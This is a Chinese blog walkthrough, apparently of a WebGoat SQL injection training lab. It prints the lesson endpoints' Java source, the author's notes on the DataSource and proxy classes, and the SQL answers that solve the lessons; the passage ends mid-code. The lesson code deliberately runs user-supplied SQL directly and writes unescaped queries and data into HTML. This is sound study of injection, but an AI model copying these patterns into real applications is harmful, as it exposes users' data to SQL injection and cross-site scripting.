<h2 id="sql-injection"><a href="#sql-injection" class="headerlink" title="sql_injection"></a>sql_injection</h2><h3 id="introduction"><a href="#introduction" class="headerlink" title="introduction"></a>introduction</h3><h4 id="SqlInjection"><a href="#SqlInjection" class="headerlink" title="SqlInjection"></a>SqlInjection</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.sql_injection.introduction;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.lessons.Category;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.lessons.Lesson;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SqlInjection</span> <span class="keyword">extends</span> <span class="title class_">Lesson</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Category <span class="title function_">getDefaultCategory</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Category.A3;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getTitle</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;1.sql.injection.title&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="SqlInjectionLesson2"><a href="#SqlInjectionLesson2" class="headerlink" title="SqlInjectionLesson2"></a>SqlInjectionLesson2</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.sql_injection.introduction;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.LessonDataSource;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentEndpoint;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentHints;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AttackResult;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Result;</span><br><span class="line"><span class="keyword">import</span> java.sql.ResultSet;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"><span class="keyword">import</span> java.sql.Statement;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> java.sql.ResultSet.CONCUR_READ_ONLY;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> java.sql.ResultSet.TYPE_SCROLL_INSENSITIVE;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@AssignmentHints(value = &#123;&quot;SqlStringInjectionHint2-1&quot;, &quot;SqlStringInjectionHint2-2&quot;, &quot;SqlStringInjectionHint2-3&quot;, &quot;SqlStringInjectionHint2-4&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SqlInjectionLesson2</span> <span class="keyword">extends</span> <span class="title class_">AssignmentEndpoint</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> LessonDataSource dataSource;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">SqlInjectionLesson2</span><span class="params">(LessonDataSource dataSource)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.dataSource = dataSource;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(&quot;/SqlInjection/attack2&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> AttackResult <span class="title function_">completed</span><span class="params">(<span class="meta">@RequestParam</span> String query)</span>&#123;</span><br><span class="line"><span class="comment">//        这里传入了query参数</span></span><br><span class="line">        <span class="keyword">return</span> injectableQuery(query);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">protected</span> AttackResult <span class="title function_">injectableQuery</span><span class="params">(String query)</span>&#123;</span><br><span class="line">        <span class="keyword">try</span>(<span class="type">var</span> <span class="variable">connection</span> <span class="operator">=</span>  dataSource.getConnection()) &#123;</span><br><span class="line">            <span class="type">Statement</span> <span class="variable">statement</span> <span class="operator">=</span> connection.createStatement(TYPE_SCROLL_INSENSITIVE,CONCUR_READ_ONLY);</span><br><span class="line">            <span class="type">ResultSet</span> <span class="variable">results</span> <span class="operator">=</span> statement.executeQuery(query);</span><br><span class="line"><span class="comment">//            这里对数据库的语句进行了执行</span></span><br><span class="line">            <span class="type">StringBuffer</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>();</span><br><span class="line"><span class="comment">//            这里使用 stringBuffer 去存储信息</span></span><br><span class="line">            results.first();</span><br><span class="line"><span class="comment">//            将光标移动到数据库的第一行</span></span><br><span class="line">            <span class="keyword">if</span> (results.getString(<span class="string">&quot;department&quot;</span>).equals(<span class="string">&quot;Marketing&quot;</span>))&#123;</span><br><span class="line"><span class="comment">//                如果从 列名 department中获取的数据为 Marketing</span></span><br><span class="line">                output.append(<span class="string">&quot;&lt;span class=&#x27;feedback-positive&#x27;&gt;&quot;</span> + query + <span class="string">&quot;&lt;/span&gt;&quot;</span>);</span><br><span class="line"><span class="comment">//                添加sql语句到html中</span></span><br><span class="line">                output.append(SqlInjectionLesson8.generateTable(results));</span><br><span class="line"><span class="comment">//                这里是去调用 8 中的生成表的方法将结果进行 html化</span></span><br><span class="line">                <span class="keyword">return</span> success(<span class="built_in">this</span>).feedback(<span class="string">&quot;sql-injection.2.success&quot;</span>).output(output.toString()).build();</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;sql-injection.2.failed&quot;</span>).output(output.toString()).build();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SQLException sqle) &#123;</span><br><span class="line">            <span class="keyword">return</span> failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;sql-injection.2.failed&quot;</span>)</span><br><span class="line">                    .output(sqle.getMessage()).build();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="SqlInjectionLesson8"><a href="#SqlInjectionLesson8" class="headerlink" title="SqlInjectionLesson8"></a>SqlInjectionLesson8</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.sql_injection.introduction;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentEndpoint;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.sql.ResultSet;</span><br><span class="line"><span class="keyword">import</span> java.sql.ResultSetMetaData;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SqlInjectionLesson8</span> <span class="keyword">extends</span> <span class="title class_">AssignmentEndpoint</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">generateTable</span><span class="params">(ResultSet results)</span><span class="keyword">throws</span> SQLException&#123;</span><br><span class="line">        <span class="type">ResultSetMetaData</span>  <span class="variable">resultSetMetaData</span> <span class="operator">=</span> results.getMetaData();</span><br><span class="line"><span class="comment">//        检索数据库中的数据</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">numColumns</span> <span class="operator">=</span> resultSetMetaData.getColumnCount();</span><br><span class="line"><span class="comment">//        获取其中的列数</span></span><br><span class="line">        results.beforeFirst();</span><br><span class="line"><span class="comment">//        将光标移动到第一行前面</span></span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">table</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line"><span class="comment">//</span></span><br><span class="line">        table.append(<span class="string">&quot;&lt;table&gt;&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (results.next())&#123;</span><br><span class="line"><span class="comment">//          如果结果集中存在值</span></span><br><span class="line">            table.append(<span class="string">&quot;&lt;tr&gt;&quot;</span>);</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; (numColumns + <span class="number">1</span>);i ++ )&#123;</span><br><span class="line"><span class="comment">//                进行计数输出</span></span><br><span class="line">                table.append(<span class="string">&quot;&lt;tr&gt;&quot;</span> + resultSetMetaData.getColumnName(i) + <span class="string">&quot;&lt;/th&gt;&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            table.append(<span class="string">&quot;&lt;/tr&gt;&quot;</span>);</span><br><span class="line">            results.beforeFirst();</span><br><span class="line"><span class="comment">//            这里也是重新回到第一个</span></span><br><span class="line">            <span class="keyword">while</span> (results.next())&#123;</span><br><span class="line">                table.append(<span class="string">&quot;&lt;tr&gt;&quot;</span>);</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>;i&lt; (numColumns + <span class="number">1</span>); i++ )&#123;</span><br><span class="line"><span class="comment">//                    这里是对数据库中查到的数据进行输出</span></span><br><span class="line">                    table.append(<span class="string">&quot;&lt;td&gt;&quot;</span> + results.getString(i) + <span class="string">&quot;&lt;/td&gt;&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                table.append(<span class="string">&quot;&lt;/tr&gt;&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            table.append(<span class="string">&quot;Query Successful; however no data was returned form this query.&quot;</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        table.append(<span class="string">&quot;&lt;/table&gt;&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> (table.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220907153510840.png" alt="image-20220907153510840"></p>
<p>首先我们需要先理解一下 这个dataSource</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220907153613466.png" alt="image-20220907153613466"></p>
<p>首先这里继承了DataSource 接口  这里面有一堆方法 那这些方法是干嘛的呢? 其次仔细看 这里的DataSource 是一个接口啊(接口是不能实例化的)  那接口执行的方法是谁的呢?</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220907153708265.png" alt="image-20220907153708265"></p>
<p>可以看到这里传进了一个dataSource方法</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220907154742560.png" alt="image-20220907154742560"></p>
<p>这里就比较好玩了 首先这里new了一个DriverManagerDataSource 众所周知 这就代表着父类对象引用指向子类多态,也就是在执行阶段是执行的DriverManagerDataSource()中的方法 那么这样的前提条件就是DriverManagerDataSource 继承了dataSource</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220907154829878.png" alt="image-20220907154829878"></p>
<p>这里依次跟过去就很容易发现 确实是这样的</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220907155034500.png" alt="image-20220907155034500"></p>
<p>接下来我们看到getConnection()  注意这里的两个getConnection其实并不相同的</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220907155328407.png" alt="image-20220907155328407"></p>
<p>进去之后就会跳到 DataSource 里面去 这很明显不可能调用接口的方法的 因此我们从前往后找</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220907155422263.png" alt="image-20220907155422263"></p>
<p>这里不存在 不要问为啥找这个类 这个是在运行的时候会调用的 java调用从子到父</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220907155506896.png" alt="image-20220907155506896"></p>
<p>这里便存在了 </p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220907155530155.png" alt="image-20220907155530155"></p>
<p>这里就可以理解为进行了连接</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220907155636967.png" alt="image-20220907155636967"></p>
<p>这里呢 是什么意思呢 很明显么 这里就是一个动态代理 不明白动态代理的 可以去看我写的反序列cc链的文章</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220907155748175.png" alt="image-20220907155748175"></p>
<p>这里简单的读一下这个LessonConnectionInvocationHandler 对象 </p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220907161322251.png" alt="image-20220907161322251"></p>
<p>这里首先继承了 InvocationHandler 类 并且重写了这里的invoke方法,也就是代表当我们执行 任意 targetConnection 的方法之后都会执行 invoke方法  可以看到这里的invoke进行了sql 的初始化操作 完成了一些预定义的命令</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220907162836126.png" alt="image-20220907162836126"></p>
<p>这里也说的比较清楚了 目的让我们去检索 bob 的部门</p>
<p>简单写一些sql语句即可完成</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select department from Employees where userid= 96134</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220907163023430.png" alt="image-20220907163023430"></p>
<h4 id="SqlInjectionLesson3"><a href="#SqlInjectionLesson3" class="headerlink" title="SqlInjectionLesson3"></a>SqlInjectionLesson3</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.sql_injection.introduction;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.LessonDataSource;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentEndpoint;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentHints;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AttackResult;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.sql.Connection;</span><br><span class="line"><span class="keyword">import</span> java.sql.ResultSet;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"><span class="keyword">import</span> java.sql.Statement;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@AssignmentHints(value = &#123;&quot;SqlStringInjectionHint3-1&quot;, &quot;SqlStringInjectionHint3-2&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SqlInjectionLesson3</span> <span class="keyword">extends</span> <span class="title class_">AssignmentEndpoint</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> LessonDataSource dataSource;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">SqlInjectionLesson3</span><span class="params">(LessonDataSource dataSource)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.dataSource = dataSource;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@PostMapping(&quot;/SqlInjection/attack3&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> AttackResult <span class="title function_">completed</span><span class="params">(<span class="meta">@RequestParam</span> String query)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> injectableQuery(query);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">protected</span> AttackResult <span class="title function_">injectableQuery</span><span class="params">(String query)</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> ( <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> dataSource.getConnection()) &#123;</span><br><span class="line">            <span class="keyword">try</span> (<span class="type">Statement</span> <span class="variable">statement</span> <span class="operator">=</span> connection.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,ResultSet.CONCUR_READ_ONLY))&#123;</span><br><span class="line">                <span class="type">Statement</span> <span class="variable">checkStatement</span> <span class="operator">=</span> connection.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,ResultSet.CONCUR_READ_ONLY);</span><br><span class="line">                statement.executeUpdate(query);</span><br><span class="line"><span class="comment">//                这里变成了更新语句</span></span><br><span class="line">                <span class="type">ResultSet</span> <span class="variable">results</span> <span class="operator">=</span> checkStatement.executeQuery(<span class="string">&quot;select * from employees where last_name=&#x27;Barnett&#x27;&quot;</span>);</span><br><span class="line">                <span class="type">StringBuffer</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>();</span><br><span class="line">                results.first();</span><br><span class="line">                <span class="keyword">if</span> (results.getString(<span class="string">&quot;department&quot;</span>).equals(<span class="string">&quot;Sales&quot;</span>))&#123;</span><br><span class="line">                    output.append(<span class="string">&quot;&lt;span class=&#x27;feedback-positive&#x27;&gt;&quot;</span>+query + <span class="string">&quot;&lt;/span&gt;&quot;</span>);</span><br><span class="line">                    output.append(SqlInjectionLesson8.generateTable(results));</span><br><span class="line">                    <span class="keyword">return</span> success(<span class="built_in">this</span>).output(output.toString()).build();</span><br><span class="line">                &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> failed(<span class="built_in">this</span>).output(output.toString()).build();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;<span class="keyword">catch</span> (SQLException sqle)&#123;</span><br><span class="line">                <span class="keyword">return</span> failed(<span class="built_in">this</span>).output(sqle.getMessage()).build();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">return</span> failed(<span class="built_in">this</span>).output(<span class="built_in">this</span>.getClass().getName() + <span class="string">&quot; : &quot;</span> + e.getMessage()).build();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220907175202885.png" alt="image-20220907175202885"></p>
<p>这里就是将tobi barnett 的部门改了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">update Employees set  department=&#x27;Sales&#x27; where userid=89762</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220907175142709.png" alt="image-20220907175142709"></p>
<h4 id="SqlInjectionLesson4"><a href="#SqlInjectionLesson4" class="headerlink" title="SqlInjectionLesson4"></a>SqlInjectionLesson4</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.sql_injection.introduction;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.LessonDataSource;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentEndpoint;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentHints;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AttackResult;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.sql.Connection;</span><br><span class="line"><span class="keyword">import</span> java.sql.ResultSet;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"><span class="keyword">import</span> java.sql.Statement;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> java.sql.ResultSet.CONCUR_READ_ONLY;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> java.sql.ResultSet.TYPE_SCROLL_INSENSITIVE;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@AssignmentHints(value = &#123;&quot;SqlStringInjectionHint4-1&quot;, &quot;SqlStringInjectionHint4-2&quot;, &quot;SqlStringInjectionHint4-3&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SqlInjectionLesson4</span> <span class="keyword">extends</span> <span class="title class_">AssignmentEndpoint</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> LessonDataSource dataSource;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">SqlInjectionLesson4</span><span class="params">(LessonDataSource dataSource)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.dataSource = dataSource;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(&quot;/SqlInjection/attack4&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> AttackResult <span class="title function_">completed</span><span class="params">(<span class="meta">@RequestParam</span> String query)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> injectableQuery(query);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> AttackResult <span class="title function_">injectableQuery</span><span class="params">(String query)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> (<span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> dataSource.getConnection()) &#123;</span><br><span class="line">            <span class="keyword">try</span> (<span class="type">Statement</span> <span class="variable">statement</span> <span class="operator">=</span> connection.createStatement(TYPE_SCROLL_INSENSITIVE, CONCUR_READ_ONLY)) &#123;</span><br><span class="line">                statement.executeUpdate(query);</span><br><span class="line">                connection.commit();</span><br><span class="line">                <span class="type">ResultSet</span> <span class="variable">results</span> <span class="operator">=</span> statement.executeQuery(<span class="string">&quot;SELECT phone from employees;&quot;</span>);</span><br><span class="line">                <span class="type">StringBuffer</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>();</span><br><span class="line">                <span class="comment">// user completes lesson if column phone exists</span></span><br><span class="line">                <span class="keyword">if</span> (results.first()) &#123;</span><br><span class="line">                    output.append(<span class="string">&quot;&lt;span class=&#x27;feedback-positive&#x27;&gt;&quot;</span> + query + <span class="string">&quot;&lt;/span&gt;&quot;</span>);</span><br><span class="line">                    <span class="keyword">return</span> success(<span class="built_in">this</span>).output(output.toString()).build();</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> failed(<span class="built_in">this</span>).output(output.toString()).build();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (SQLException sqle) &#123;</span><br><span class="line">                <span class="keyword">return</span> failed(<span class="built_in">this</span>).output(sqle.getMessage()).build();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">return</span> failed(<span class="built_in">this</span>).output(<span class="built_in">this</span>.getClass().getName() + <span class="string">&quot; : &quot;</span> + e.getMessage()).build();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220907185338908.png" alt="image-20220907185338908"></p>
<p>添加一列数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alter table employees add phone varchar(20)</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220907185247380.png" alt="image-20220907185247380"></p>
<h4 id="SqlInjectionLesson5"><a href="#SqlInjectionLesson5" class="headerlink" title="SqlInjectionLesson5"></a>SqlInjectionLesson5</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.sql_injection.introduction;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.LessonDataSource;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentEndpoint;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentHints;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AttackResult;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.annotation.PostConstruct;</span><br><span class="line"><span class="keyword">import</span> java.sql.Connection;</span><br><span class="line"><span class="keyword">import</span> java.sql.ResultSet;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"><span class="keyword">import</span> java.sql.Statement;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@AssignmentHints(value = &#123;&quot;SqlStringInjectionHint5-1&quot;, &quot;SqlStringInjectionHint5-2&quot;, &quot;SqlStringInjectionHint5-3&quot;, &quot;SqlStringInjectionHint5-4&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SqlInjectionLesson5</span> <span class="keyword">extends</span> <span class="title class_">AssignmentEndpoint</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> LessonDataSource dataSource;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">SqlInjectionLesson5</span><span class="params">(LessonDataSource dataSource)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.dataSource = dataSource;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostConstruct</span></span><br><span class="line"><span class="comment">//    @PostConstruct注解的方法在项目启动的时候执行这个方法，也可以理解为在spring容器启动的时候执行，可作为一些数据的常规化加载，比如数据字典之类的。</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">createUser</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> (<span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> dataSource.getConnection()) &#123;</span><br><span class="line">            <span class="keyword">try</span> (<span class="type">var</span> <span class="variable">statement</span> <span class="operator">=</span> connection.prepareStatement(<span class="string">&quot;create user unauthorized_user password test&quot;</span>))&#123;</span><br><span class="line"><span class="comment">//                postgresql 创建一个 unauthorized_user 用户密码为 test</span></span><br><span class="line">                statement.execute();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line"><span class="comment">//              user already exists continue</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(&quot;/SqlInjection/attack5&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> AttackResult <span class="title function_">completed</span><span class="params">(String query)</span>&#123;</span><br><span class="line">        createUser();</span><br><span class="line">        <span class="keyword">return</span> injectableQuery(query);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">protected</span> AttackResult <span class="title function_">injectableQuery</span><span class="params">(String query)</span>&#123;</span><br><span class="line">        <span class="keyword">try</span>(<span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> dataSource.getConnection()) &#123;</span><br><span class="line">            <span class="keyword">try</span> (<span class="type">Statement</span> <span class="variable">statement</span> <span class="operator">=</span> connection.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,ResultSet.CONCUR_READ_ONLY))&#123;</span><br><span class="line">                statement.executeQuery(query);</span><br><span class="line">                <span class="keyword">if</span> (checkSolution(connection))&#123;</span><br><span class="line">                    <span class="keyword">return</span> success(<span class="built_in">this</span>).build();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> failed(<span class="built_in">this</span>).output(<span class="string">&quot;Your query was: &quot;</span>+ query).build();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">return</span> failed(<span class="built_in">this</span>).output(<span class="built_in">this</span>.getClass().getName()+ <span class="string">&quot; : &quot;</span> + e.getMessage() + <span class="string">&quot;&lt;br&gt; Your query was: &quot;</span>+ query ).build();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span 